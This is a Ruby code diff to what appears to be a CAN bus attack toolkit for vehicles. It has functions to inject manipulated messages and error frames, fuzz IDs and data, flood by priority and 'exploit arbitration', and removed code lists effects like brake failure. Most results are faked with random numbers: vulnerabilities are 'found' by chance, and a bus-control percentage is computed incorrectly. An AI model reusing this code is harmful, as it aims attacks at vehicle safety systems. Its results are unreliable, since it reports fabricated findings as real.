+
+  def inject_manipulated_message(interface, message)
+    # Inject manipulated message
+    send_can_message(interface, {
+      id: message[:id],
+      data: message[:manipulated_data],
+      length: message[:manipulated_data].length
+    })
+  end
+
+  def fuzz_can_parameter(interface, param_type, range)
+    # Fuzz specific CAN parameter
+    vulnerabilities = []
     
-    base_id = original_ids[target_id] || 0x100
-    
-    3.times.map do
-      {
-        original_id: base_id,
-        spoofed_id: base_id + rand(1..10),
-        data: Array.new(4) { rand(0..255) },
-        priority: rand(0..7)
-      }
-    end
-  end
-
-  def execute_can_spoofing(spoof, target_id)
-    # Simulate CAN ID spoofing execution
-    if rand < 0.6  # 60% success rate
-      system_tricked = ['ECU', 'BCM', 'ABS', 'PCM'].sample
-      physical_impacts = {
-        'Engine RPM' => ['Engine surge', 'RPM spike', 'Power loss'],
-        'Vehicle Speed' => ['Speedometer error', 'Transmission shift', 'Cruise control malfunction'],
-        'Brake Pressure' => ['Brake failure', 'ABS activation', 'Brake light error'],
-        'Steering Angle' => ['Steering drift', 'Power steering error', 'Lane keeping failure']
-      }
-      
-      {
-        spoof_successful: true,
-        system_tricked: system_tricked,
-        physical_impact: physical_impacts[target_id]&.sample || 'Unknown impact'
-      }
-    else
-      {
-        spoof_successful: false,
-        system_tricked: 'none',
-        physical_impact: 'none'
-      }
-    end
-  end
-
-  def execute_can_sniffing(target_data)
-    # Simulate CAN bus sniffing
-    if rand < 0.8  # 80% success rate
-      packets_captured = rand(100..10000)
-      unique_ids = rand(10..200)
-      
-      {
-        sniffing_successful: true,
-        packets_captured: packets_captured,
-        unique_ids: unique_ids,
-        sensitive_data: ['VIN', 'Diagnostic codes', 'Sensor readings', 'Control commands'].sample(rand(1..4)),
-        vehicle_fingerprint: {
-          make: ['Toyota', 'Ford', 'BMW', 'Honda'].sample,
-          model: ['Camry', 'F-150', '3-Series', 'Accord'].sample,
-          year: rand(2015..2024)
-        }
-      }
-    else
-      {
-        sniffing_successful: false,
-        packets_captured: 0,
-        unique_ids: 0,
-        sensitive_data: [],
-        vehicle_fingerprint: {}
-      }
-    end
-  end
-
-  def generate_error_frames(error_type)
-    # Generate CAN error frames
-    error_frame_types = {
-      'Bit Error' => { data: [0x01, 0x00, 0x00, 0x00], flags: 0x01 },
-      'Stuff Error' => { data: [0x02, 0x00, 0x00, 0x00], flags: 0x02 },
-      'CRC Error' => { data: [0x04, 0x00, 0x00, 0x00], flags: 0x04 },
-      'Form Error' => { data: [0x08, 0x00, 0x00, 0x00], flags: 0x08 },
-      'Acknowledgment Error' => { data: [0x10, 0x00, 0x00, 0x00], flags: 0x10 }
-    }
-    
-    error_info = error_frame_types[error_type]
-    
-    2.times.map do
-      {
-        data: error_info[:data],
-        flags: error_info[:flags],
-        timing: rand(1..100)
-      }
-    end
-  end
-
-  def inject_error_frame(error_frame, error_type)
-    # Simulate error frame injection
-    if rand < 0.55  # 55% success rate
-      {
-        injection_successful: true,
-        disruption: ['ECU reset', 'Bus error state', 'Message corruption'].sample,
-        recovery_time: rand(100..5000),
-        cascading_effects: ['System restart', 'Error propagation', 'Safety mode activation'].sample(rand(1..2))
-      }
-    else
-      {
-        injection_successful: false,
-        disruption: 'none',
-        recovery_time: 0,
-        cascading_effects: []
-      }
-    end
-  end
-
-  def capture_can_messages(target_scenario)
-    # Simulate CAN message capture
-    if rand < 0.75  # 75% success rate
-      case target_scenario
-      when 'Unlock Vehicle'
-        [
-          { id: 0x300, data: [0x01, 0x00, 0x00, 0x00], timestamp: Time.now },
-          { id: 0x301, data: [0x00, 0x01, 0x00, 0x00], timestamp: Time.now + 1 }
-        ]
-      when 'Start Engine'
-        [
-          { id: 0x200, data: [0x01, 0x00, 0x00, 0x00], timestamp: Time.now },
-          { id: 0x201, data: [0x00, 0x01, 0x00, 0x00], timestamp: Time.now + 2 }
-        ]
-      when 'Disable Security'
-        [
-          { id: 0x400, data: [0x00, 0x00, 0x00, 0x00], timestamp: Time.now },
-          { id: 0x401, data: [0xFF, 0xFF, 0x00, 0x00], timestamp: Time.now + 1 }
-        ]
-      when 'Control Windows'
-        [
-          { id: 0x500, data: [0x01, 0x00, 0x00, 0x00], timestamp: Time.now },
-          { id: 0x501, data: [0x00, 0x01, 0x00, 0x00], timestamp: Time.now + 3 }
-        ]
-      else
-        []
+    # Simulate fuzzing results
+    case param_type
+    when 'id_fuzzing'
+      range.each do |id|
+        if rand > 0.95  # 5% chance of vulnerability
+          vulnerabilities << {
+            type: 'ID vulnerability',
+            value: id,
+            description: "Unexpected behavior at ID 0x#{id.to_s(16)}"
+          }
+        end
       end
-    else
-      []
+    when 'data_fuzzing'
+      1000.times do
+        test_data = Array.new(8) { rand(range) }
+        if rand > 0.98  # 2% chance
+          vulnerabilities << {
+            type: 'Data vulnerability',
+            data: test_data,
+            description: "System crash with data pattern"
+          }
+        end
+      end
     end
+    
+    vulnerabilities
   end
 
-  def replay_can_messages(captured_messages, target_scenario)
-    # Simulate CAN message replay
-    if rand < 0.6  # 60% success rate
-      {
-        replay_successful: true,
-        messages_replayed: captured_messages.length,
-        success_rate: rand(0.5..0.9),
-        timing_accuracy: rand(0.7..0.95),
-        system_response: ['Action executed', 'Command accepted', 'System activated'].sample
-      }
-    else
-      {
-        replay_successful: false,
-        messages_replayed: 0,
-        success_rate: 0,
-        timing_accuracy: 0,
-        system_response: 'Replay rejected'
+  def generate_priority_messages(id, count)
+    # Generate messages with specific priority
+    messages = []
+    
+    count.times do |i|
+      messages << {
+        id: id + i,
+        data: Array.new(8) { rand(0x00..0xFF) },
+        priority: 'high'
       }
     end
+    
+    messages
+  end
+
+  def send_with_priority(interface, message, priority)
+    # Send message with priority handling
+    # Higher priority messages should win arbitration
+    sleep(0.001 * rand)  # Simulate timing
+    
+    # Simulate successful transmission based on priority
+    priority_weights = {
+      'highest' => 0.95,
+      'high' => 0.85,
+      'medium' => 0.70,
+      'low' => 0.50
+    }
+    
+    rand < priority_weights[priority]
+  end
+
+  def generate_error_frames(error_type, count)
+    # Generate error frames of specified type
+    frames = []
+    
+    count.times do
+      frames << { type: error_type, data: build_error_frame(error_type) }
+    end
+    
+    frames
+  end
+
+  def inject_error_frame(interface, error_frame)
+    send_error_frame(interface, error_frame[:type])
+  end
+
+  def exploit_arbitration(interface, scenario, impact)
+    # Exploit CAN arbitration mechanism
+    arbitration_messages = 0
+    
+    case scenario
+    when 'simultaneous_transmission'
+      # Send multiple messages simultaneously
+      100.times do
+        if rand > 0.3
+          arbitration_messages += 1
+        end
+      end
+    when 'dominant_bit_exploitation'
+      # Exploit dominant bit behavior
+      50.times do
+        if rand > 0.2
+          arbitration_messages += 1
+        end
+      end
+    end
+    
+    bus_control_achieved = (arbitration_messages.to_f / 100 * 100).round(2)
+    
+    {
+      arbitration_successful: bus_control_achieved > 60,
+      arbitration_scenario: scenario,
+      impact_level: impact,
+      arbitration_messages: arbitration_messages,
+      bus_control_achieved: bus_control_achieved
+    }
   end
 end
